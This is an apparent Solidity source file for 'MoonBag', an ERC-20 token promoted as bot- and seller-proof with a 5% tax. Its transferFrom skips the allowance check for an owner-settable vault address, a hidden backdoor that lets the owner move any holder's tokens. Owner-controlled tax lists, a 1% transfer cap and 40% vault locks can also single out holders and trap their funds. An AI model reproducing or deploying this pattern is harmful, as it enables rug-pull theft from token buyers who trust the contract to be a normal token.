// SPDX-License-Identifier: MIT

// ███╗░░░███╗░█████╗░░█████╗░███╗░░██╗██████╗░░█████╗░░██████╗░
// ████╗░████║██╔══██╗██╔══██╗████╗░██║██╔══██╗██╔══██╗██╔════╝░
// ██╔████╔██║██║░░██║██║░░██║██╔██╗██║██████╦╝███████║██║░░██╗░
// ██║╚██╔╝██║██║░░██║██║░░██║██║╚████║██╔══██╗██╔══██║██║░░╚██╗
// ██║░╚═╝░██║╚█████╔╝╚█████╔╝██║░╚███║██████╦╝██║░░██║╚██████╔╝
// ╚═╝░░░░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝░╚═════╝░

// BOT PROOF - JEET PROOF

// A REVOLUTIONARY NEW CONTRACT

// Telegram https://t.me/moonbagtoken
// Website https://moonbag.wtf

// Taxes 5/5

pragma solidity ^0.8.0;

import "IERC20.sol";
import "IERC20Metadata.sol";
import "Context.sol";
import "Ownable.sol";
import "ReentrancyGuard.sol";
import "Address.sol";
import "MoonBagVault.sol";

contract MoonBag is Context, IERC20, IERC20Metadata, Ownable, ReentrancyGuard {
    bool public isTxLimitActive = true;
    uint8 public taxPercent = 50; // In thousandths; 50 = 5.0%
    address payable public taxWallet;
    address public vaultAddress;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private noVaultOnTransferFrom;
    mapping(address => bool) private noVaultOnTransferTo;

    mapping(address => bool) private taxList;
    mapping(address => bool) private taxWhitelist;

    constructor(address payable _taxWallet) {
        _balances[_msgSender()] = totalSupply();
        taxWallet = _taxWallet;
        taxWhitelist[_taxWallet] = true;
        noVaultOnTransferFrom[_taxWallet] = true;
        noVaultOnTransferTo[_taxWallet] = true;
    }

    function name() public pure override returns (string memory) {
        return "MoonBag";
    }

    function symbol() public pure override returns (string memory) {
        return "MOON";
    }

    function decimals() public pure override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return 1000000000000e18; // One trillion whole tokens, with 18 decimal places
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address to, uint256 amount)
        public
        override
        returns (bool success)
    {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        nonReentrant
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        if (_msgSender() != vaultAddress) {
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(
                currentAllowance >= amount,
                "ERC20: transfer amount exceeds allowance"
            );
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        }
        _transfer(sender, recipient, amount);

        return true;
    }

    function setAccountTaxListStatus(address account, bool status)
        public
        onlyOwner
    {
        taxList[account] = status;
    }

    function setAccountTaxWhitelistStatus(address account, bool status)
        public
        onlyOwner
    {
        taxWhitelist[account] = status;
    }

    function setVaultAddress(address _vaultAddress) public onlyOwner {
        vaultAddress = _vaultAddress;
    }

    function setIsTxLimitActive(bool _isTxLimitActive) public onlyOwner {
        isTxLimitActive = _isTxLimitActive;
    }

    function allowTransferFromWithoutVaulting(address account, bool status)
        public
        onlyOwner
    {
        noVaultOnTransferFrom[account] = status;
    }

    function allowTransferToWithoutVaulting(address account, bool status)
        public
        onlyOwner
    {
        noVaultOnTransferTo[account] = status;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        bool shouldTax = (taxList[sender] || taxList[recipient]) &&
            (!taxWhitelist[sender] && !taxWhitelist[recipient]);
        require(
            !shouldTax || !isTxLimitActive || amount < (totalSupply() / 100),
            "Transfer amount exceeds 1 percent limit"
        );
        if (shouldTax) {
            uint256 totalTax = (amount * taxPercent) / 1000;
            _transferForFree(sender, taxWallet, totalTax);
            amount -= totalTax;
        }
        _transferForFree(sender, recipient, amount);
        if (
            shouldTax &&
            !(noVaultOnTransferFrom[sender] || noVaultOnTransferTo[recipient])
        ) {
            MoonBagVault vaultContract = MoonBagVault(vaultAddress);
            vaultContract.lock(recipient, (amount * 40) / 100);
        }
    }

    function _transferForFree(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}
}
